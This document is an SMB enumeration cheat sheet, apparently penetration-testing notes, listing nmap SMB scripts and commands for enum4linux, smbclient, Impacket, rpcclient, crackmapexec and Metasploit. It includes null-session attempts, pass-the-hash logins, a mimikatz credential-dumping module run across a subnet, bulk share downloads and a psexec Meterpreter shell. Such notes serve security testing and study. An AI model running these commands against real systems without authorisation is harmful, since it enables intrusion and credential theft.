# SMB Enumeration Tools

### Nmap Enumeration
```
$ ls -lh /usr/share/nmap/scripts/ | grep smb
-rw-r--r-- 1 root root  3355 Oct 12 09:29 smb2-capabilities.nse
-rw-r--r-- 1 root root  3075 Oct 12 09:29 smb2-security-mode.nse
-rw-r--r-- 1 root root  1447 Oct 12 09:29 smb2-time.nse
-rw-r--r-- 1 root root  5238 Oct 12 09:29 smb2-vuln-uptime.nse
-rw-r--r-- 1 root root 45138 Oct 12 09:29 smb-brute.nse
-rw-r--r-- 1 root root  5289 Oct 12 09:29 smb-double-pulsar-backdoor.nse
-rw-r--r-- 1 root root  4840 Oct 12 09:29 smb-enum-domains.nse
-rw-r--r-- 1 root root  5971 Oct 12 09:29 smb-enum-groups.nse
-rw-r--r-- 1 root root  8043 Oct 12 09:29 smb-enum-processes.nse
-rw-r--r-- 1 root root 27274 Oct 12 09:29 smb-enum-services.nse
-rw-r--r-- 1 root root 12097 Oct 12 09:29 smb-enum-sessions.nse
-rw-r--r-- 1 root root  6923 Oct 12 09:29 smb-enum-shares.nse
-rw-r--r-- 1 root root 12527 Oct 12 09:29 smb-enum-users.nse
-rw-r--r-- 1 root root  1706 Oct 12 09:29 smb-flood.nse
-rw-r--r-- 1 root root  7471 Oct 12 09:29 smb-ls.nse
-rw-r--r-- 1 root root  8758 Oct 12 09:29 smb-mbenum.nse
-rw-r--r-- 1 root root  8220 Oct 12 09:29 smb-os-discovery.nse
-rw-r--r-- 1 root root  4982 Oct 12 09:29 smb-print-text.nse
-rw-r--r-- 1 root root  1831 Oct 12 09:29 smb-protocols.nse
-rw-r--r-- 1 root root 63596 Oct 12 09:29 smb-psexec.nse
-rw-r--r-- 1 root root  5190 Oct 12 09:29 smb-security-mode.nse
-rw-r--r-- 1 root root  2424 Oct 12 09:29 smb-server-stats.nse
-rw-r--r-- 1 root root 14159 Oct 12 09:29 smb-system-info.nse
-rw-r--r-- 1 root root  7524 Oct 12 09:29 smb-vuln-conficker.nse
-rw-r--r-- 1 root root  6402 Oct 12 09:29 smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 23154 Oct 12 09:29 smb-vuln-cve-2017-7494.nse
-rw-r--r-- 1 root root  6545 Oct 12 09:29 smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root  5386 Oct 12 09:29 smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root  5688 Oct 12 09:29 smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root  5647 Oct 12 09:29 smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root  7214 Oct 12 09:29 smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root  7344 Oct 12 09:29 smb-vuln-ms17-010.nse
-rw-r--r-- 1 root root  4400 Oct 12 09:29 smb-vuln-regsvc-dos.nse
-rw-r--r-- 1 root root  6586 Oct 12 09:29 smb-vuln-webexec.nse
-rw-r--r-- 1 root root  5084 Oct 12 09:29 smb-webexec-exploit.nse
$ nmap x.x.x.x -v -p 139,445 --script=exampleScript1.nse,exampleScript2.nse
```

### Enum4linux

All simple checks:
```
enum4linux -a x.x.x.x
```

Brute force guessing for share names:
`enum4linux -s /usr/share/enum4linux/share-list.txt x.x.x.x`

### Nmap: 
- `nmap --script smb-* -p 139,445, 172.21.0.0`
- `nmap --script smb-enum-* -p 139,445, 172.21.0.0`

```
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-services.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-flood.nse
/usr/share/nmap/scripts/smb-ls.nse
/usr/share/nmap/scripts/smb-mbenum.nse
/usr/share/nmap/scripts/smb-os-discovery.nse
/usr/share/nmap/scripts/smb-print-text.nse
/usr/share/nmap/scripts/smb-protocols.nse
/usr/share/nmap/scripts/smb-psexec.nse
/usr/share/nmap/scripts/smb-security-mode.nse
/usr/share/nmap/scripts/smb-server-stats.nse
/usr/share/nmap/scripts/smb-system-info.nse
```

### SMBmap

```
$ smbmap -H 172.21.0.0 -d [domain] -u [user] -p [password]
$ smbmap -H 172.21.0.0 -d [domain] -u "" -p ""
```

### SMBClient
```
$ smbclient -L 172.21.0.0
$ smbclient -L x.x.x.x -U ""
$ smbclient //172.21.0.0/tmp
```

If you have a user name or guest login works:
```
$ smbclient //windows_server_NETBIOS_NAME/destination_folder -U WINDOWS_USER -I x.x.x.x
```
or
```
$ smbclient -L //x.x.x.x -U guest -i x.x.x.x
```

Recursively list a directory:
```
$ smbclient \\\\x.x.x.x\\Folder
smb: \> recurse on             
smb: \> ls
```
Recursively get all files in a share:
```
$ smbget -R smb://x.x.x.x/Folder/ -U Username
```

### Impacket 

```
python3 /usr/share/doc/python3-impacket/examples/smbclient.py username@x.x.x.x
```

```
python3 samdump.py SMB x.x.x.x
```

### Impacket SmbClient: 
```
/usr/share/doc/python3-impacket/examples/smbclient.py username@172.21.0.0
```

### RPCclient

```
rpcclient -U "" -N x.x.x.x enumdomusers
```

Attempt an null connection:
```
rpcclient -U '' x.x.x.x
```

### CrackMapExec

```
$ crackmapexec smb -L 
$ crackmapexec x.x.x.x -u Administrator -H [hash] --local-auth
$ crackmapexec x.x.x.x -u Administrator -H [hash] --share
$ crackmapexec smb x.x.x.0/24 -u user -p 'Password' --local-auth -M mimikatz
```
Attempt an null connection:
```
$ crackmapexec smb x.x.x.x --pass-pol -u '' -p ''
```

### Polenum

Attempt an null connection:
```
$ polenum -u '' -p '' -d x.x.x.x
```

### Metasploit

If you have user credentials, you can use them to get a Meterpreter shell on the machine running smb:

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS x.x.x.x
msf6 > set SMBUser <username>
msf6 > set SMBPass <password>
msf6 > set RPORT <default_is_445>
msf6 > run
```